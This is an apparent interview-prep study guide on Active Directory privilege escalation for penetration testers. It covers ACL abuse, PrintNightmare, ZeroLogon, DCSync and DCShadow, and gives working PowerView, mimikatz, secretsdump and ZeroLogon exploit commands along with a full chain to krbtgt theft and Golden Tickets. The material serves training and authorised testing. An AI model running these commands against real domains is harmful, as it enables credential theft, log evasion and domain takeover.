---
tags: [vapt, methodology, active-directory, interview, master-guide]
difficulty: expert
module: "Ultimate VAPT Master Guides - AD"
topic: "Master Guide - AD VAPT 04"
---

# AD VAPT 04 - Domain Privilege Escalation, DCSync, and DCShadow

## Introduction
The ultimate goal of an Active Directory penetration test is the complete, undisputed takeover of the domain. This phase involves exploiting misconfigured Access Control Lists (ACLs), built-in replication protocols, and cryptographic flaws to elevate privileges from a lateral compromised account to Enterprise or Domain Administrator. DCSync and DCShadow represent the apex of AD exploitation—abusing legitimate administrative features rather than software vulnerabilities.

## Interview Strategy: Discussing Domain Escalation
Interviewers look for candidates who understand that AD exploitation is primarily about misconfigurations, not just CVEs.

**The Expert's Pitch:**
> *"When looking for Domain Privilege Escalation, I focus heavily on Active Directory ACLs mapped by BloodHound. I look for non-standard inheritance, specifically `GenericAll`, `WriteDacl`, or `ForceChangePassword` edges over privileged groups like Domain Admins or the HelpDesk. 
> Furthermore, I look for paths to acquire `Replicating Directory Changes` privileges. Once I have those, I don't need to actually exploit the Domain Controller directly. Instead, I execute a **DCSync** attack, simulating a domain controller to request the password hashes of any user, including the `krbtgt` account. If I need a highly stealthy persistence mechanism, I'll utilize **DCShadow** to briefly register my attacker machine as a rogue Domain Controller, push malicious attribute changes directly into the AD database without logging normal event IDs, and then unregister."*

---

## Phase 1: Exploiting Active Directory ACLs

Access Control Lists define what an object (User, Group, Computer) can do to another object. BloodHound simplifies finding these, but you must know how to exploit them.

### 1. GenericAll (Full Control)
If User A has `GenericAll` over User B, User A can do anything to User B.
*   **Attack:** Force reset User B's password without knowing their current password.
*   **Execution (PowerView):**
```powershell
# Reset password for target user
Set-DomainUserPassword -Identity victim_user -AccountPassword 'Pwned123!'
```

### 2. WriteDacl
If User A has `WriteDacl` over a Group, User A can modify the permissions of that group.
*   **Attack:** Grant yourself `GenericAll` over the group, then add yourself as a member of the group.
*   **Execution (PowerView):**
```powershell
# Grant our user full control over the target group
Add-DomainObjectAcl -TargetIdentity "Domain Admins" -PrincipalIdentity attacker_user -Rights All
# Add attacker to the group
Add-DomainGroupMember -Identity "Domain Admins" -Members attacker_user
```

### 3. GenericWrite on a Computer Object (RBCD)
Covered in Guide 03, having `GenericWrite` over a computer object allows you to configure Resource-Based Constrained Delegation and compromise the machine.

---

## Phase 2: High-Impact CVEs & Attack Paths

While misconfigurations are king, certain CVEs are so impactful they act as immediate domain escalations.

### 1. PrintNightmare (CVE-2021-1675 / CVE-2021-34527)
Exploits the Windows Print Spooler service to achieve remote code execution as `SYSTEM`. If the Domain Controller runs the Print Spooler (which was default historically), this leads to instant Domain Admin.
*   **Execution:** Using impacket's `rpcdump.py` to check for MS-RPRN, then firing a custom exploit script to load a malicious DLL.

### 2. ZeroLogon (CVE-2020-1472)
A cryptographic flaw in the Netlogon Remote Protocol (MS-NRPC). An attacker can spoof an authentication token and set the Domain Controller's machine account (`DC01$`) password to a blank value.
*   **Impact:** Instant DCSync capability.
*   **Execution:**
```bash
# Verify vulnerability
python3 zerologon_tester.py DC01 192.168.1.10
# Exploit
python3 cve-2020-1472-exploit.py DC01 192.168.1.10
```

---

## Phase 3: The Apex Attacks - DCSync and DCShadow

### 1. DCSync Attack
DCSync abuses the Directory Replication Service Remote Protocol (MS-DRSR). Normally, Domain Controllers use this protocol to synchronize passwords and data amongst themselves. If an attacker gains an account with `DS-Replication-Get-Changes` and `DS-Replication-Get-Changes-All` privileges, they can ask the DC for the NTLM hash of *any* user.

**Why it's dangerous:** You do not need to execute code on the DC. You just send a legitimate replication request.

**Execution (Mimikatz):**
```cmd
# Requires running as a user with replication privileges (e.g., DA)
mimikatz.exe "lsadump::dcsync /domain:targetdomain.local /user:krbtgt" "exit"
```

**Execution (Impacket from Linux):**
```bash
secretsdump.py targetdomain.local/administrator:Password123@<DC_IP> -just-dc-user krbtgt
```

### 2. DCShadow Attack
DCShadow is the ultimate stealth technique. Instead of requesting data from the DC (like DCSync), DCShadow *pushes* data to the DC. The attacker registers their own workstation as a temporary Domain Controller in the AD topology. They then force a replication push to inject changes (like adding a backdoor to an admin account) into the real DC.

**Why it's stealthy:** It bypasses standard AD logging (Event ID 4728 for adding a user to a group is NOT generated). The logs only show a replication event.

**Execution (Mimikatz):**
Requires `SYSTEM` on a workstation, and Domain Admin privileges.
```cmd
# Terminal 1 (Run as SYSTEM): Start the RPC server to act as a DC
mimikatz.exe "lsadump::dcshadow /object:TargetAdmin /attribute:userAccountControl /value:532480"

# Terminal 2 (Run as DA): Trigger the replication push
mimikatz.exe "lsadump::dcshadow /push"
```

---

## Custom ASCII Attack Diagram (DCSync)

```text
    [Attacker Machine]
      (Compromised DA / Replicator Account)
             |
             | (1) MS-DRSR: "I am a DC, please replicate data"
             v
     [Active Directory Domain Controller]
             |
             | (2) Validates DS-Replication privileges
             |
             | (3) Packages requested data (krbtgt hash, history)
             v
    [Attacker Machine]
             |
             | (4) Extracts NTLM Hashes & AES Keys
             v
       [krbtgt Hash Captured]
             |
             v
     (5) Forge Golden Tickets for Persistence
```

---

## Real-World Attack Scenario

**The Setup:** The tester gained access to a standard developer workstation. Through BloodHound, they identified a path to Domain Admin.
**The Execution:**
1. The tester's compromised user had `GenericAll` over the `IT_Support` group.
2. The tester used PowerView to add themselves to the `IT_Support` group.
3. The `IT_Support` group had `WriteDacl` permissions over the `Domain Admins` group.
4. Using PowerView, the tester abused `WriteDacl` to grant themselves `GenericAll` over `Domain Admins`.
5. The tester then forced a password reset on a dormant Domain Admin account (`BackupAdmin`).
6. Using the new `BackupAdmin` credentials, the tester executed `secretsdump.py` across the network to perform a DCSync attack.
7. They targeted the `krbtgt` account, extracting its NTLM hash and AES keys, successfully taking total cryptographic control over the Active Directory environment.

## Chaining Opportunities
*   **ACL Abuse to DCSync:** As demonstrated above, gaining `WriteDacl` or `GenericAll` over the Domain object itself directly grants the replication privileges required to launch DCSync.
*   **ZeroLogon to DCSync:** Exploiting ZeroLogon gives the attacker the Machine Account hash of the DC. They can use this hash to authenticate and instantly DCSync the entire directory.
*   **DCSync to Golden Ticket:** Once DCSync is successful and the `krbtgt` hash is acquired, the attacker immediately chains this into forging a Golden Ticket for long-term persistence (See [[Master Guide - AD VAPT 05]]).

## Related Notes
*   [[Master Guide - AD VAPT 03]] - Exploiting NTLM Relays and Kerberos Flaws
*   [[Master Guide - AD VAPT 05]] - Cross-Forest Trusts and AD Persistence
*   [[BloodHound Advanced Edge Exploitation]]
*   [[Active Directory Access Control Lists (ACLs)]]

---
**End of File**
